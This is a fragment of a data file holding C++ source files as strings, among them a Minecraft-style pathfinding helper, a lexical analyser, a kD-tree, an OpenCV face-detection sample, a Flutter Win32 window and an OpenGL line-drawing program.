\"web\"};\n\n\t\tfor (uintptr_t** vtable : knownVtableSet)\n\t\t\tif (obs1->Vtable == vtable)\n\t\t\t\treturn true;\n\n\t\tif (obs1->tileName.getTextLength() < 6)\n\t\t\treturn false;\n\n\t\tfor (int i = 0; i < dangerousTiles.size(); i++) {\n\t\t\tconst char* tile = dangerousTiles[i];\n\t\t\tif (strcmp(obs1->tileName.getText() + 5 /*cutoff tile. prefix*/, tile) != 0)\n\t\t\t\tcontinue;\n\n\t\t\tknownVtableSet.insert(obs1->Vtable);\n\t\t\tdangerousTiles.erase(dangerousTiles.begin() + i);\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\n__forceinline bool isDangerousPlayer(const Vec3i& pos, BlockSource* reg, bool allowWater = false) {\n\treturn isDangerous(pos, reg, allowWater) || isDangerous(pos.add(0, 1, 0), reg, allowWater);\n}\n\n__forceinline bool canStandOn(const Vec3i& pos, BlockSource* reg, bool inWater = false) {\n\tauto block = reg->getBlock(pos);\n\tauto standOn = block->toLegacy();\n\tbool validWater = inWater && standOn->hasWater(reg, pos);\n\tif (validWater) {\n\t\t// block above has to be water as well\n\t\tauto swimPos = pos.add(0, 1, 0);\n\t\tauto swimIn = reg->getBlock(swimPos)->toLegacy();\n\t\tvalidWater = swimIn->hasWater(reg, swimPos);\n\t}\n\tif (!standOn->material->isSolid && !validWater)\n\t\treturn false;\n\tif (isDangerous(pos, reg, inWater))\n\t\treturn false;\n\n\tif (validWater)\n\t\treturn true;\n\tif (true)\n\t\treturn true;\n\n\tAABB aabb;\n\tif (!standOn->getCollisionShape(&aabb, block, reg, &pos, nullptr))\n\t\treturn false;\n\n\tauto diff = aabb.lower.sub(aabb.upper);\n\n\tif (ceilf(aabb.upper.y) - aabb.upper.y > 0.13f /* 0.125 for soulsand and farmland*/)\n\t\treturn false;\n\n\tif (ceilf(aabb.upper.x) - aabb.upper.x > 0.07f /* 0.0625 for chests*/)\n\t\treturn false;\n\tif (ceilf(aabb.upper.z) - aabb.upper.z > 0.07f /* 0.0625 for chests*/)\n\t\treturn false;\n\treturn fabsf(diff.x) > 0.85f && fabsf(diff.z) > 0.85f;\n}\n__forceinline bool isObstructed(const Vec3i& pos, BlockSource* reg, bool allowWater = false) {\n\tauto block = reg->getBlock(pos);\n\tauto obs1 = block->toLegacy();\n\tif (obs1->material->isBlockingMotion)\n\t\treturn true;\n\n\tAABB aabb{};\n\tbool hasBox = obs1->getCollisionShape(&aabb, block, reg, &pos, nullptr);\n\n\tif (hasBox)\n\t\treturn true;\n\n\treturn isDangerous(pos, reg, allowWater);\n}\n__forceinline bool isObstructedPlayer(const Vec3i& pos, BlockSource* reg, bool allowWater = false) {\n\treturn isObstructed(pos, reg, allowWater) || isObstructed(pos.add(0, 1, 0), reg);\n}\n\nstd::vector<Edge> findEdges(std::unordered_map<unsigned __int64, Node>& allNodes, const Node& startNode, BlockSource* reg, NodeRef startNodeRef) {\n\tstd::vector<Edge> edges;\n\tauto startBlock = reg->getBlock(startNode.pos)->toLegacy();\n\tbool isInWater = startBlock->ha",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nbool isDelimiter(char c) {\n    if (c == ' ' || c == '+' || c == '-' || c == '*' ||\n        c == '/' || c == ',' || c == ';' || c == '>' ||\n        c == '<' || c == '=' || c == '(' || c == ')' ||\n        c == '[' || c == ']' || c == '{' || c == '}')\n        return true;\n    return false;\n}\n\nbool isOperator(char c) {\n    if (c == '+' || c == '-' || c == '*' || c == '/' || c == '>' || c == '<' || c == '=')\n        return true;\n    return false;\n}\n\nbool isKeyword(string str) {\n    // List of C++ keywords\n    string keywords[] = {\"auto\", \"break\", \"case\", \"char\", \"const\", \"continue\", \"default\",\n                              \"do\", \"double\", \"else\", \"enum\", \"extern\", \"float\", \"for\", \"goto\",\n                              \"if\", \"int\", \"long\", \"register\", \"return\", \"short\", \"signed\",\n                              \"sizeof\", \"static\", \"struct\", \"switch\", \"typedef\", \"union\",\n                              \"unsigned\", \"void\", \"volatile\", \"while\"};\n\n    for (string keyword : keywords) {\n        if (str == keyword)\n            return true;\n    }\n    return false;\n}\n\nbool isInteger(string str) {\n    try {\n        stoi(str);\n        return true;\n    } catch (invalid_argument&) {\n        return false;\n    }\n}\n\nbool isRealNumber(string str) {\n    try {\n        stod(str);\n        return true;\n    } catch (invalid_argument&) {\n        return false;\n    }\n}\n\nbool validIdentifier(string str) {\n    if (!isalpha(str[0]) && str[0] != '_')\n        return false;\n\n    for (char c : str) {\n        if (!isalnum(c) && c != '_')\n            return false;\n    }\n\n    return true;\n}\n\n\nvoid parse(string str, vector<vector<string>> &v) {\n    int left = 0, right = 0;\n    int len = str.size();\n    \n    while (right < len && left <= right) {\n        if (!isDelimiter(str[right]))\n            right++;\n\n        if (isDelimiter(str[right]) && left == right) {\n            if (isOperator(str[right]))\n                cout << \"'\" << str[right] << \"' IS A OPERATOR\" << endl;\n            right++;\n            left = right;\n        } else if (isDelimiter(str[right]) && left != right\n                || (right == len && left != right)) {\n            string subStr = str.substr(left, right - left);\n            if (isKeyword(subStr))\n                cout << \"'\" << subStr << \"' IS A KEYWORD\" << endl;\n\n            else if (isInteger(subStr))\n                cout << \"'\" << subStr << \"' IS AN INTEGER\" << endl;\n\n            else if (isRealNumber(subStr))\n                cout << \"'\" << subStr << \"' IS A REAL NUMBER\" << endl;\n\n            else if (validIdentifier(subStr) && !isDelimiter(str[right - 1]))\n                cout << \"'\" << subStr << \"' IS A VALID IDENTIFIER\" << endl;\n\n            else if (!validIdentifier(subStr) && !isDelimiter(str[right - 1]))\n                cout << \"'\" << subStr << \"' IS NOT A VALID IDENTIFIER\" << endl;\n            left = right;\n        }\n    }\n}\n\nint main() {\n    string s;\n    // string s=\"int a=b+c;\";\n    cout<<\"Enter the number of lines you want to enter: \";\n    vector<vector<string>> v(6);\n    int n;\n    cin>>n;\n    for(int i=-1;i<n;i++){\n        getline(cin,s);\n        parse(s,v);\n    }\n    return 0;\n}\n\n",
    "#include \"EP.h\"\n#include \"../../config.h\"\n\n/** Constructor.\n* @param v1id the id of the supplier.\n* @param v2id the id of the absorber.\n* @param begin the beginning of the transfer. **/\nEP::EP(std::string supplierID, std::string absorberID)\n{\n\tthis->supplierID = supplierID;\n\tthis->absorberID = absorberID;\n}\n/** Destructor. **/\nEP::~EP()\n{\n\tfor (Setpoint* sp : setpoints)\n\t{\n\t\tdelete sp;\n\t}\n}\n\n/** Returns the id of the supplier Node.\n* @return The node id.**/\nstd::string EP::getSupplierID()\n{\n\treturn supplierID;\n}\n\n/** Returns the id of the absorber Node.\n* @return The node id.**/\nstd::string EP::getAbsorberID()\n{\n\treturn absorberID;\n}\n\n/** Returns a list of all Setpoint objects of a transfer.\n* @return The list of setpoint objects.**/\nstd::list<Setpoint*> EP::getSetpoints()\n{\n\treturn setpoints;\n}\n\n/** Returns the begin of the transfer.\n* @return The begin. **/\nint EP::getBegin()\n{\n\treturn setpoints.front()->getBegin();\n}\n\n/** Returns the duration of the transfer.\n* @return The duration. **/\nint EP::getDuration()\n{\n\treturn getEnd() - getBegin() + 1;\n}\n\n/** Returns the end of the transfer.\n* @return The end. **/\nint EP::getEnd()\n{\n\treturn setpoints.back()->getBegin() + setpoints.back()->getDuration() - 1;\n}\n\n/** Returns the amount of energy transferred with this EP.\n* @return The energy in Wh. **/\ndouble EP::getEnergy()\n{\n\treturn energy;\n}\n/** Adds a power setpoint to an EP.\n@param power the power of the setpoint\n@param begin the begin of the setpoint\n@param duration the duration of the setpoint\n@param type the type of the setpoint**/\nvoid EP::addPowerSetpoint(double power, int begin, int duration, Setpoint::Types type)\n{\n\tsetpoints.push_back(new Setpoint(power, 0, -power, 0, begin, duration, type));\n}\n/** Adds a current setpoint to an EP.\n@param current the power of the setpoint\n@param begin the begin of the setpoint\n@param duration the duration of the setpoint\n@param type the type of the setpoint**/\nvoid EP::addCurrentSetpoint(double current, int begin, int duration, Setpoint::Types type)\n{\n\tsetpoints.push_back(new Setpoint(0, current, 0, -current, begin, duration, type));\n}\n/** Adds a power and current setpoint to an EP with distinction between absorber and supplier.\n@param supplierPower the power of the supplier at this setpoint.\n@param supplierCurrent the current of the supplier at this setpoint.\n@param absorberPower the power of the absorber at this setpoint.\n@param absorberCurrent the current of the absorber at this setpoint.\n@param begin the begin of the setpoint\n@param duration the duration of the setpoint\n@param type the type of the setpoint**/\nvoid EP::addMixedSetpoint(double supplierPower, double supplierCurrent, double absorberPower, double absorberCurrent, int begin, int duration, Setpoint::Types type)\n{\n\tsetpoints.push_back(new Setpoint(supplierPower, supplierCurrent, absorberPower, absorberCurrent, begin, duration, type));\n}\n\n/** Converts a time in seconds to a timeslot index.\n* @param time the time in seconds\n* @return The index of the according timeslot. **/\ndouble EP::toTimeslot(double time)\n{\n\treturn time / S_PER_TIMESLOT;\n}\n",
    "#include <string>\n#include \"book.h\"\nusing namespace mybook;\n\n// Default Constructor\nBook::Book()\n{\n    bookName = \"None\";\n    bookAuthor = \"None\";\n    bookStatus = \"None\";\n    dateStart = \"None\";\n    dateFinish = \"None\";\n}\n\n// Overloaded Constructor\nBook::Book(string bookName, string bookAuthor, string bookStatus, string dateStart, string dateFinish)\n    : bookName(bookName), bookAuthor(bookAuthor), bookStatus(bookStatus), dateStart(dateStart), dateFinish(dateFinish)\n{\n    // No need for assignments here, as member initializer list is used\n}\n\n// Get Functions\nstring Book::getName() const\n{\n    return bookName;\n}\n\nstring Book::getAuthor() const\n{\n    return bookAuthor;\n}\n\nstring Book::getStatus() const\n{\n    return bookStatus;\n}\n\nstring Book::getDateStart() const\n{\n    return dateStart;\n}\n\nstring Book::getDateFinish() const\n{\n    return dateFinish;\n}\n\n// Set Functions\nvoid Book::setStatus(string bookStatus)\n{\n    this->bookStatus = bookStatus;\n}\n\nvoid Book::setDateStart(string dateStart)\n{\n    this->dateStart = dateStart;\n}\n\nvoid Book::setDateFinish(string dateFinish)\n{\n    this->dateFinish = dateFinish;\n}\n\nvoid Book::setName(string bookName)\n{\n    this->bookName = bookName;\n}\n\nvoid Book::setAuthor(string bookAuthor)\n{\n    this->bookAuthor = bookAuthor;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\nusing namespace std;\n\n// Fungsi untuk mencari pbb dengan menggunakan algoritma Euclidean\nint fpbeuclidean(int m, int n) { \n   int r;\n   while (n != 0) { \n      r = m % n; // var nampung hasil sisa pembagian dari m dan n \n      m = n; // var untuk bilangan positif yang ingin dicari FPB-Nya\n      n = r; //masukkan nilai r kedalam variabel n.\n   }\n   \n   return m; //Hasil FPB dari m dan n adalah nilai m.\n}\n\nint main() {\n   char ulangin; //variabel untuk melakukan perulangan untuk jalanin program ya/tidak\n   do { // untuk melakukan looping pada opsi ingin melakukan program perulangan/tidak\n\n      system(\"cls\");\n      \n      int m, n; // m untuk nampung bilangan ke 1 dan n untuk bilangan ke2\n//masukkan bilangan 1 dan bilangan 2\n      cout << \"==============KALKULATOR MENCARI FPB================\" << endl;\n      cout << \"Masukkan bilangan pertama : \";\n        cin >> m;\n      cout << \"Masukkan bilangan kedua : \";\n         cin >> n;\n\n      int fpb = fpbeuclidean(m, n); //variabel fpb untuk meyimpan hasil dari fungsi fpbeuclidean yang dimana fungsi ini\n      //sambungan penjelasan pendeklarasian diatas --> untuk meneruskan var m dan var n\n\n    //setelah hasil fpb telah didapat dan disimpan di var fpb tadi yang diatas itu \n      cout << \"\\nHasil faktor persekutuan terbesar dari \" << m << \" dan \" << n << \" adalah \" << fpb << endl; //tampilin hasil fpb-Nya\n\n      // Request ingin melakukan perulangan atau tidak\n      cout << \"Apakah ingin melakukan perulangan pada program ini? (y/t): \";\n        cin >> ulangin;\n   } \n   \n   //opsi melakukan ulangin program atau tidak\n   while (ulangin == 'Y' || ulangin == 'y'); // looping melakukan opsi perulangan program fpb \n    cout << \"================================================================\" << endl;\n        cout << \"Terimakasih user sudah melakukan perintah pada program ini\";\n\n   return 0;\n}",
    "#include \"kDTree.hpp\"\n\n/* TODO: You can implement methods, functions that support your data structures here.\n * */\n\n// deep copy tree\nkDTreeNode* deepCopyTree(kDTreeNode *root) {\n    if (!root) \n        return nullptr;\n    kDTreeNode *curNode = new kDTreeNode(root->data);\n    curNode->left = deepCopyTree(root->left);\n    curNode->right = deepCopyTree(root->right);\n    return curNode;\n}\n\n// max of two numbers\nint max(const int &a, const int &b) {\n    return (a > b) ? a : b;\n}\n\n// assignment operator\nconst kDTree &kDTree::operator=(const kDTree &other)\n{\n    clear();        // clear old tree\n    // copy a new tree from \"other\"\n    root = deepCopyTree(other.root);\n    k = other.k;\n    return *this;\n}\n\n// copy constructor\nkDTree::kDTree(const kDTree &other) {\n    root = deepCopyTree(other.root);\n    k = other.k;\n}\n\n// print inorder\n// input: none\n// output: inorder traversal and \n//         print node without white space at the end\nvoid printInorder(kDTreeNode *root) {\n    if (!root)\n        return;\n    printInorder(root->left);\n    if (root->left && root->right) {\n        // have both left child and right child\n        cout << \" \" << *root << \" \";\n    } else if (root->left) {\n        // have left child but do not have right child\n        cout << \" \" << *root;\n    } else if (root->right) {\n        // have right child but do not have left child\n        cout << *root << \" \";\n    } else {\n        // have no child\n        cout << *root;\n    }\n    printInorder(root->right);\n}\n\nvoid kDTree::inorderTraversal() const {\n    printInorder(root);\n}\n\n// print preorder\n// input: none\n// output: preorder traversal and \n//         print node without white space at the end\nvoid printPreorder(kDTreeNode *root) {\n    if (!root)\n        return;\n    if (root->left) {\n        // have left child\n        cout << *root << \" \";\n    } else {\n        // do not have left child\n        cout << *root;\n    }\n    printPreorder(root->left);\n    if (root->right) {\n        // have right child\n        cout << \" \";\n    }\n    printPreorder(root->right);\n}\n\n\nvoid kDTree::preorderTraversal() const {\n    printPreorder(root);\n}\n\n\n// print postorder\n// input: none\n// output: postorder traversal and \n//         print node without white space at the end\nvoid printPostorder(kDTreeNode *root) {\n    if (!root)\n        return;\n    printPostorder(root->left);\n    if (root->left) {\n        // have left child\n        cout << \" \";\n    }\n    printPostorder(root->right);\n    if (root->right) {\n        // have right child\n        cout << \" \";\n    }\n    cout << *root;\n}\n\nvoid kDTree::postorderTraversal() const {\n    printPostorder(root);\n}\n\n// get height of tree\n// input: none \n// output: height of tree\nint heightOfTree(kDTreeNode *root) {\n    if (!root)\n        return 0;\n    return 1 + max(heightOfTree(root->left), heightOfTree(root->right));\n}\n\nint kDTree::height() const {\n    return heightOfTree(root);\n}\n\n\n// count number of nodes in tree\n// input: none\n// output: number of nodes\nint numberOfNode(kDTreeNode *root) {\n    if (!root)\n        return 0;\n    return 1 + numberOfNode(root->left) + numberOfNode(root->right);\n}\n\nint kDTree::nodeCount() const {\n    return numberOfNode(root);\n}\n\n// count number of leaf nodes in tree\n// input: none\n// output: number of leafs\nint numberOfLeafs(kDTreeNode *root) {\n    if (!root)\n        return 0;\n    if (!root->left && !root->right)\n        return 1;\n    return numberOfLeafs(root->left) + numberOfLeafs(root->right);\n}\n\nint kDTree::leafCount() const {\n    return numberOfLeafs(root);\n}\n\n// delete the tree\n// input: none\n// output: empty tree\nvoid deleteTree(kDTreeNode *&root) {\n    if (!root)\n        return;\n    // if (!root->left && !root->right) {\n    //     // delete leaf node\n    //     kDTreeNode *delNode = root;\n    //     root = nullptr;\n    //     delete delNode;\n    //     return;\n    // }\n    deleteTree(root->left);\n    deleteTree(root->right);\n    kDTreeNode *delNode = root;\n    root = nullptr;\n    delete delNode;\n}\n\nvoid kDTree::clear() {\n    deleteTree(root);\n}\n\n\n// insert node to the tree\nvoid insertRecursion(kDTreeNode *&root, \n                     const vector<int> &point, \n                     int dimension, \n                     const int &k,\n                     const int &label = -1) {\n    if (!root) {\n        root = new kDTreeNode(point, nullptr, nullptr, label);\n    } else if (point[dimension] < root->data[dimension]) {\n        // insert to left tree\n        insertRecursion(root->left, point, (dimension + 1) % k, k, label);\n    } else {\n        // insert to right tree\n        insertRecursion(root->right, point, (dimension + 1) % k, k, label);\n    }\n}\n\nvoid kDTree::insert(const vector<int> &point, const int &label) {\n    if ((int)point.size() != k)\n        return;\n    insertRecursion(root, point, 0, k);\n}\n\n// Merge Sort ascending\n// input: list, start, end, dimenstion compare\n// output: none\nvoid mergeSort(vector<vector<int>> &listPoints, \n               vector<int> &listLabels,\n               int startIdx, \n  ",
    "#include <opencv2/dnn.hpp>\n#include <opencv2/highgui.hpp>\n#include <opencv2/imgproc.hpp>\n#include <opencv2/objdetect.hpp>\n\n#include <iostream>\n\nusing namespace cv;\nusing namespace std;\n\nstatic void visualize(Mat &input, int frame, Mat &faces, double fps,\n                      int thickness = 2) {\n  std::string fpsString = cv::format(\"FPS : %.2f\", (float)fps);\n  if (frame >= 0)\n    cout << \"Frame \" << frame << \", \";\n  cout << \"FPS: \" << fpsString << endl;\n  for (int i = 0; i < faces.rows; i++) {\n    // Print results\n    cout << \"Face \" << i << \", top-left coordinates: (\" << faces.at<float>(i, 0)\n         << \", \" << faces.at<float>(i, 1) << \"), \"\n         << \"box width: \" << faces.at<float>(i, 2)\n         << \", box height: \" << faces.at<float>(i, 3) << \", \"\n         << \"score: \" << cv::format(\"%.2f\", faces.at<float>(i, 14)) << endl;\n\n    // Draw bounding box\n    rectangle(input,\n              Rect2i(int(faces.at<float>(i, 0)), int(faces.at<float>(i, 1)),\n                     int(faces.at<float>(i, 2)), int(faces.at<float>(i, 3))),\n              Scalar(0, 255, 0), thickness);\n    // Draw landmarks\n    circle(input,\n           Point2i(int(faces.at<float>(i, 4)), int(faces.at<float>(i, 5))), 2,\n           Scalar(255, 0, 0), thickness);\n    circle(input,\n           Point2i(int(faces.at<float>(i, 6)), int(faces.at<float>(i, 7))), 2,\n           Scalar(0, 0, 255), thickness);\n    circle(input,\n           Point2i(int(faces.at<float>(i, 8)), int(faces.at<float>(i, 9))), 2,\n           Scalar(0, 255, 0), thickness);\n    circle(input,\n           Point2i(int(faces.at<float>(i, 10)), int(faces.at<float>(i, 11))), 2,\n           Scalar(255, 0, 255), thickness);\n    circle(input,\n           Point2i(int(faces.at<float>(i, 12)), int(faces.at<float>(i, 13))), 2,\n           Scalar(0, 255, 255), thickness);\n  }\n  putText(input, fpsString, Point(0, 15), FONT_HERSHEY_SIMPLEX, 0.5,\n          Scalar(0, 255, 0), 2);\n}\n\nint main(int argc, char **argv) {\n  CommandLineParser parser(\n      argc, argv,\n      \"{help h | | Print this message}\"\n      \"{image1 i1 | | Path to the input image1. Omit for detecting through \"\n      \"VideoCapture}\"\n      \"{image2 i2 | | Path to the input image2. When image1 and image2 \"\n      \"parameters given then the program try to find a face on both images and \"\n      \"runs face recognition algorithm}\"\n      \"{video v | 0 | Path to the input video}\"\n      \"{scale sc | 1.0 | Scale factor used to resize input video frames}\"\n      \"{fd_model fd | face_detection_yunet_2021dec.onnx| Path to the model. \"\n      \"Download yunet.onnx in \"\n      \"https://github.com/opencv/opencv_zoo/tree/master/models/\"\n      \"face_detection_yunet}\"\n      \"{fr_model fr | face_recognition_sface_2021dec.onnx | Path to the face \"\n      \"recognition model. Download the model at \"\n      \"https://github.com/opencv/opencv_zoo/tree/master/models/\"\n      \"face_recognition_sface}\"\n      \"{score_threshold | 0.9 | Filter out faces of score < score_threshold}\"\n      \"{nms_threshold | 0.3 | Suppress bounding boxes of iou >= nms_threshold}\"\n      \"{top_k | 5000 | Keep top_k bounding boxes before NMS}\"\n      \"{save s | false | Set true to save results. This flag is invalid when \"\n      \"using camera}\");\n  if (parser.has(\"help\")) {\n    parser.printMessage();\n    return 0;\n  }\n\n  String fd_modelPath = parser.get<String>(\"fd_model\");\n  String fr_modelPath = parser.get<String>(\"fr_model\");\n\n  float scoreThreshold = parser.get<float>(\"score_threshold\");\n  float nmsThreshold = parser.get<float>(\"nms_threshold\");\n  int topK = parser.get<int>(\"top_k\");\n\n  bool save = parser.get<bool>(\"save\");\n  float scale = parser.get<float>(\"scale\");\n\n  double cosine_similar_thresh = 0.363;\n  double l2norm_similar_thresh = 1.128;\n\n  // Initialize FaceDetectorYN\n  Ptr<FaceDetectorYN> detector = FaceDetectorYN::create(\n      fd_modelPath, \"\", Size(320, 320), scoreThreshold, nmsThreshold, topK);\n\n  TickMeter tm;\n\n  // If input is an image\n  if (parser.has(\"image1\")) {\n    String input1 = parser.get<String>(\"image1\");\n    Mat image1 = imread(samples::findFile(input1));\n    if (image1.empty()) {\n      std::cerr << \"Cannot read image: \" << input1 << std::endl;\n      return 2;\n    }\n\n    int imageWidth = int(image1.cols * scale);\n    int imageHeight = int(image1.rows * scale);\n    resize(image1, image1, Size(imageWidth, imageHeight));\n    tm.start();\n\n    // Set input size before inference\n    detector->setInputSize(image1.size());\n\n    Mat faces1;\n    detector->detect(image1, faces1);\n    if (faces1.rows < 1) {\n      std::cerr << \"Cannot find a face in \" << input1 << std::endl;\n      return 1;\n    }\n\n    tm.stop();\n    // Draw results on the input image\n    visualize(image1, -1, faces1, tm.getFPS());\n\n    // Save results if save is true\n    if (save) {\n      cout << \"Saving result.jpg...\\n\";\n      imwrite(\"result.jpg\", image1);\n    }\n\n    // Visualize results\n    imshow(\"image1\", image1);\n    pollKey(); // handle UI events to show content\n\n    if (parser.has(\"image2\")) {\n      String",
    "#include <iostream>\n#include <GL/glut.h>\n#include<math.h>\nusing namespace std;\n\nint h = 640;\nint w = 400;\n\nstatic int menu_id;\nstatic int submenu_id;\nstatic int submenu_dotted_id;\nstatic int submenu_dashed_id;\n\nvoid myInit() {\n\tglClearColor(1.0,1.0,1.0,1.0);\n\tglColor3f(0.0,0.0,0.0);\n\tglPointSize(15.0);\n\tgluOrtho2D(0,640,0,400);\n}\nvoid DDA_simple(float x1,float y1,float x2,float y2);\nvoid Bresenham_simple(float x1,float y1,float x2,float y2);\nvoid DDA_dotted(float x1,float y1,float x2,float y2);\nvoid Bresenham_dotted(float x1,float y1,float x2,float y2);\nvoid DDA_dashed(float x1,float y1,float x2,float y2);\nvoid Bresenham_dashed(float x1,float y1,float x2,float y2);\n\nvoid mainMenu(int choice);\nvoid submenu(int choice);\nvoid submenu_dotted(int choice);\nvoid submenu_dashed(int choice);\n\nvoid coordinate() {\n\tglBegin(GL_LINES);\n\t\tglVertex2d(h/2,0);\n\t\tglVertex2d(h/2,w);\n\t\tglVertex2d(0,w/2);\n\t\tglVertex2d(h,w/2);\n\tglEnd();\n\tglFlush();\n}\nvoid MyDisplay(){\n\tglClear( GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\tcoordinate();\n\n\n\n}\nint main (int argc,char **argv){\n\tglutInit(&argc,argv);\n\tglutInitDisplayMode(GLUT_SINGLE |GLUT_RGB);\n\tglutInitWindowPosition(0,0);\n\tglutInitWindowSize(h,w);\n\tglutCreateWindow(\"Sample\");\n\n\tglutDisplayFunc(MyDisplay);\n\n\n\t// menu\n\tsubmenu_id=glutCreateMenu(submenu);\n\tglutAddMenuEntry(\"DDA\",1);\n\tglutAddMenuEntry(\"BRESNHAM\",2);\n\n\t// submenu for dotted line\n\tsubmenu_dotted_id=glutCreateMenu(submenu_dotted);\n\tglutAddMenuEntry(\"DDA\",1);\n\tglutAddMenuEntry(\"BRESNHAM\",2);\n\n\t// submenu for dashed line\n\tsubmenu_dashed_id=glutCreateMenu(submenu_dashed);\n\tglutAddMenuEntry(\"DDA\",1);\n\tglutAddMenuEntry(\"BRESNHAM\",2);\n\n\t// menu\n\tmenu_id = glutCreateMenu(mainMenu);\n\tglutAddMenuEntry(\"MAIN MENU\",0);\n\tglutAddSubMenu(\"SIMPLE LINE\",submenu_id);\n\tglutAddSubMenu(\"DOTTED LINE\",submenu_dotted_id);\n\tglutAddSubMenu(\"DASHED LINE\",submenu_dashed_id);\n\tglutAttachMenu(GLUT_RIGHT_BUTTON);\n\tmyInit();\n\n\tglutMainLoop();\n\treturn 0;\n}\n\nvoid submenu(int choice) {\n\t//color = colors[choice];\n\tswitch (choice) {\n            case 1:\n             \tDDA_simple(10, 50, 100, 200);\n            \tbreak;\n\n            case 2:\n            \tBresenham_simple(50,10,200,100);\n            \tbreak;\n\t\t}\n}\n\nvoid submenu_dotted(int choice) {\n\t//color = colors[choice];\n\tswitch (choice) {\n            case 1:\n             \tDDA_dotted(10, 50, 100, 200);\n            \tbreak;\n\n            case 2:\n            \tBresenham_dotted(50,10,200,100);\n            \tbreak;\n\t\t}\n}\n\nvoid submenu_dashed(int choice) {\n\t//color = colors[choice];\n\tswitch (choice) {\n            case 1:\n             \tDDA_dashed(10, 50, 100, 200);\n            \tbreak;\n\n            case 2:\n            \tBresenham_dashed(50,10,200,100);\n            \tbreak;\n\t\t}\n}\n\nvoid mainMenu(int choice) {\n\t//color = colors[choice];\n}\n\n// DDA SIMPLE LINE\nvoid DDA_simple(float x1,float y1,float x2,float y2) {\n\tglPointSize(5.0);\n\tfloat dx = x2-x1;\n\tfloat dy = y2-y1;\n\tint steps = 0;\n\tfloat m = dy/dx;\n\tint i = 